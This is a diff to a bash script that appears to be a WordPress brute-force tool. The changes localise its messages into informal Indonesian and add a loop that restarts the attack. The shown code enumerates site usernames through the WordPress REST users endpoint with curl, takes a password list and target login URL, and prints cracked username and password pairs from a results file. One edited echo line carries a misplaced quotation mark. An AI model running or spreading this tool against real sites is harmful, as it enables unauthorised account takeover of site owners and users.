@@ -24,7 +24,7 @@ function _GetUserWPJSON() {
     UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")')
     echo ""
     if [[ -z ${UsernameLists} ]]; then
-        echo -e "${RED}INFO: Cannot detect Username!${CLR}"
+        echo -e "${RED}user sesuai target${CLR}"
     else
         echo -ne > wpusername.tmp
         for Username in ${UsernameLists}; do
@@ -49,6 +49,7 @@ function _TestLogin() {
 
 # Print Banner
 echo -e "\x1b[1;96m
+
                    __        ______                            
                   \ \      / /  _ \                           
                    \ \ /\ / /| |_) |                          
@@ -57,7 +58,14 @@ echo -e "\x1b[1;96m
  | __ )|  _ \| | | |_   _| ____|  ___/ _ \|  _ \ / ___| ____| 
  |  _ \| |_) | | | | | | |  _| | |_ | | | | |_) | |   |  _|   
  | |_) |  _ <| |_| | | | | |___|  _|| |_| |  _ <| |___| |___  
- |____/|_| \_\\___/  |_|_| |_____|_|  \___/|_| \_\\_____|_____| 
+ |____/|_| \_\\___/ |_|_| |_____|_|   \___/|_| \_\\____|_____| 
+
+
+
+? = https://target.id/wp-login.php
+? = pass.txt
+? = admin
+
                                              
 "
 
@@ -86,12 +94,12 @@ if [[ -s wpusername.tmp ]]; then
         )
     done
 else
-    echo -e "${RED}user sesuai target${CLR}"
+    echo -e "${RED}   ${CLR}"
     echo -ne "[?] Input username > \x1b[1;97m"
     read User
 
     if [[ -z ${User} ]]; then
-        echo -e "${RED}user target nya salah ya :(${CLR}"
+        echo -e "${RED}user target nya salah ya :("${CLR}
         exit
     fi
     echo ''
@@ -106,8 +114,26 @@ fi
 
 found_count=$(grep -c ${Target} wpbf-results.txt)
 if [[ ${found_count} -gt 0 ]]; then
-    echo -e "${GRN}INFO: Found ${found_count} username & password in ./wpbf-results.txt${CLR}"
+    echo -e "${GRN}Found ${found_count} username & password in ./wpbf-results.txt${CLR}"
     cat wpbf-results.txt
 else
-    echo -e "${RED}INFO: yha target yang anda cari kosong${CLR}"
+    echo -e "${RED}yha target yang anda cari kosong${CLR}"
 fi
+
+# Tambahkan opsi untuk berhenti atau melanjutkan
+while true; do
+    echo -ne "\n[?] Apakah ingin melanjutkan brute-force lagi? (t/y) > "
+    read pilihan
+    case $pilihan in
+        [Yy])
+            exec "$0"
+            ;;
+        [Tt])
+            echo "Keluar dari program."
+            exit
+            ;;
+        *)
+            echo "Pilihan tidak valid. Masukkan 'y' untuk lanjut atau 't' untuk keluar."
+            ;;
+    esac
+done
